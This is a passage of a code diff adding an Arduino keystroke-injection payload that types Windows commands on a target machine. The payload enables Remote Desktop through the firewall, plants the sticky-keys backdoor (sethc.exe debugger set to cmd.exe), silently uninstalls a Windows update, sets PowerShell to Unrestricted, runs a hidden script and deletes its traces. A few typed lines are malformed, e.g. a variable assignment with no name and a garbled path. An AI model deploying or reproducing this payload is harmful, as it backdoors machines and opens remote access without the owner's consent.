+    delay(defaultDelay);
+    Keyboard.print("netsh advfirewall firewall set rule group='remote desktop - remotefx' new enable=Yes");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("netsh advfirewall firewall set rule group='remote desktop' new enable=Yes");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d C:\\windows\\system32\\cmd.exe");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$input=\"KB27475\"");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$input = $input.Replace('KB', '')");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("= 'wusa /quiet /norestart /uninstall /kb:' + $input");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("Invoke-Expression -Command $cmdString");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Report >> $fileSaveDir'/ComputerInfo.html'");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("function copy-ToZip($fileSaveDir){");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$srcdir = $fileSaveDir");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$zipFile = 'C/:Users\\Report.zip'");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("if(-not (test-path($zipFile))) {");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("set-content $zipFile (\"PK\" + [char]5 + [char]6 + (\"$([char]0)\" * 18))");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("(dir $zipFile).IsReadOnly = $false}");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$shellApplication = new-object -com shell.application");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$zipPackage = $shellApplication.NameSpace($zipFile)");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$files = Get-ChildItem -Path $srcdir");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("foreach($file in $files) {");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$zipPackage.CopyHere($file.FullName)");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("while($zipPackage.Items().Item($file.name) -eq $null){");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("Start-sleep -seconds 1 }}}");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("copy-ToZip($fileSaveDir)");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("remove-item $fileSaveDir -recurse");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("Remove-Item $MyINvocation.InvocationName");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.press(KEY_LEFT_CTRL);
+    Keyboard.press(115);
+    Keyboard.releaseAll();
+
+    delay(defaultDelay);
+    delay(750);
+
+    delay(defaultDelay);
+    Keyboard.print("C:\\Windows\\config-68588.ps1");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    delay(1000);
+
+    delay(defaultDelay);
+    Keyboard.press(KEY_LEFT_ALT);
+    Keyboard.press(KEY_F4);
+    Keyboard.releaseAll();
+
+    delay(defaultDelay);
+    delay(750);
+
+    delay(defaultDelay);
+    Keyboard.press(KEY_LEFT_GUI);
+    Keyboard.press(114);
+    Keyboard.releaseAll();
+
+    delay(defaultDelay);
+    delay(500);
+
+    delay(defaultDelay);
+    Keyboard.print("powershell Start-Process cmd -Verb runAs");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    delay(1000);
+
+    delay(defaultDelay);
+    Keyboard.press(KEY_LEFT_ALT);
+    Keyboard.press(121);
+    Keyboard.releaseAll();
+
+    delay(defaultDelay);
+    delay(750);
+
+    delay(defaultDelay);
+    Keyboard.print("mode con:cols=14 lines=1");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.press(KEY_LEFT_ALT);
+    Keyboard.press(' ');
+    Keyboard.releaseAll();
+
+    delay(defaultDelay);
+    delay(750);
+
+    delay(defaultDelay);
+    Keyboard.print("m");
+
+    delay(defaultDelay);
+    delay(1000);
+
+    delay(defaultDelay);
+    typeKey(KEY_DOWN_ARROW);
+    for(int i = 0; i < 100; i++) {
+      typeKey(KEY_DOWN_ARROW);
+    }
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    delay(750);
+
+    delay(defaultDelay);
+    Keyboard.print("powershell.exe -windowstyle hidden -File C:\\Windows\\config-68588.ps1");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+    
+    /* ----- End-Script -----*/
+    
+    Keyboard.end();
+  }
+}
+
+void loop(){
+  ledOn = !ledOn;
+  digitalWrite(ledPin, ledOn);
+  delay(blinkInterval);
+}
